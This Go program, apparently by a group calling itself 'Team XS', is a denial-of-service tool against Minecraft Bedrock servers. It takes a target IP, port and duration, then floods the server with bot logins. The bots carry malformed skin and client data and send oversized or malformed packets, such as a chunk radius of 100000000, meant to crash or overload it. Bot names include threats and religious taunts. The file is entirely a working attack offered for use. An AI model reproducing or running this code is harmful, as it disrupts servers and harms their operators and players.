package main

import (
    "context"
    "github.com/sandertv/gophertunnel/minecraft"
    "github.com/sandertv/gophertunnel/minecraft/protocol/login"
    "github.com/sandertv/gophertunnel/minecraft/protocol/packet"
    "github.com/sandertv/gophertunnel/minecraft/protocol"
    "log"
    "os"
    "runtime"
    "strconv"
    "sync"
    "time"
    "strings"
)

func main() {
    if len(os.Args) < 4 {
        log.Fatalf("Usage: %s <target IP> <target port> <time in seconds>", os.Args[0])
    }

    devNull, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
    if err != nil {
        log.Fatalf("General failure /dev/null: %v", err)
    }
    defer devNull.Close()
    os.Stdout = devNull
    log.SetOutput(devNull)

    targetIP := os.Args[1]
    targetPort := os.Args[2]
    duration, err := strconv.Atoi(os.Args[3])
    if err != nil {
        log.Fatalf("Invalid time argument: %s", os.Args[3])
    }

    log.Println("Started, Made by Team XS, Fucks up servers console")
    log.Println("Written in go by: XS Flies, XS Flood")

    displayNames := []string{"XS FLOOD", "XS MAIN","NoGodButAllah","AllahuAkbar","XSInvisible", "XS", "IOwnYou", "XS OnTop", "PrepareToEatLead", "UrLifeEndsNOW", "XSFLOOD", "NO WAY", "XS XS XS"}
    counter := make(map[string]int)
    var mu sync.Mutex

    createDisplayName := func(baseName string) string {
        mu.Lock()
        defer mu.Unlock()
        counter[baseName]++
        return baseName + strconv.Itoa(counter[baseName])
    }

      
     imageString := strings.Repeat("A", 2425)
    animatedImageData := []login.SkinAnimation{
        {
            Image: imageString,
            ImageHeight: 1000000000000,
            ImageWidth: 10000000000000000,
            Frames: -11111111111111111111,
            AnimationExpression: 1111111111111111011,
        },
    }
        

    clientData := login.ClientData{
        ThirdPartyNameOnly: true,
        MaxViewDistance:    3,
        MemoryTier:         11001,
        IsEditorMode:       false,
        DeviceModel:        "01000000110100000000000001010101010101010010100000010111100101000101010101000001010111001000101100010101110101010101010101010100000001011110000001001001001010100101101000100100101010",
        GameVersion:        "HIGH",
        PremiumSkin:        false,
        ThirdPartyName:     "0101010101010100101010101010101110100001110010101110101000110101010000111000001010101000101010101001",
        SkinData:           "",
        CurrentInputMode:   1110011010001110,
        CapeData:           "",
        SelfSignedID: "FFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
        GUIScale: 1,
        ServerAddress: "",
        AnimatedImageData: animatedImageData,
    }

    maxGoroutines := runtime.NumCPU() * 2
    var wg sync.WaitGroup
    ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
    defer cancel()

    for i := 0; i < maxGoroutines; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for {
                select {
                case <-ctx.Done():
                    log.Println("Time limit reached, exiting goroutine.")
                    os.Exit(0)
                default:
                    for _, baseName := range displayNames {
                        identityData := login.IdentityData{
                            DisplayName: createDisplayName(baseName),
                        }

                        dialer := minecraft.Dialer{
                            ClientData:   clientData,
                            IdentityData: identityData,
                            EnableClientCache: true,
                            FlushRate: 1,
                            DisconnectOnUnknownPackets: true,
                            DisconnectOnInvalidPackets: true,
                            KeepXBLIdentityData: true,
                        }


                        conn, err := dialer.Dial("raknet", targetIP+":"+targetPort)
                        if err != nil {
                            log.Println("Dial error:", err)
                            continue
                        }

                        p := &packet.RequestChunkRadius{ChunkRadius: 100000000}
                        if err := conn.WritePacket(p); err != nil {
                            log.Printf("WritePacket error: %v. Reconnecting...\n", err)
                            break
                        }

                        p2 := &packet.InventoryTransaction{
                            LegacySetItemSlots: []protocol.LegacySetItemSlot{
                                {
                                    ContainerID: 100,
                                    Slots:       []byte{0, 1, 200, 120, 000, 11, 111}, 
                                },
                            },
                        }                    

                        if err := conn.WritePacket(p2); err != nil {
                            log.Printf("WritePacket error: %v. Reconnecting...\n", err)
                            break
                        }

                        p3 := &packet.UpdateAttributes{
                            EntityRuntimeID: 10101010100101111,
                        }                    

                        if err := conn.WritePacket(p3); err != nil {
                            log.Printf("WritePacket error: %v. Reconnecting...\n", err)
                            break
                        }

                    }
                }
            }
        }()
    }

    <-ctx.Done()
    cancel()
    wg.Wait()
    log.Println("All goroutines finished")
    os.Exit(0)
}
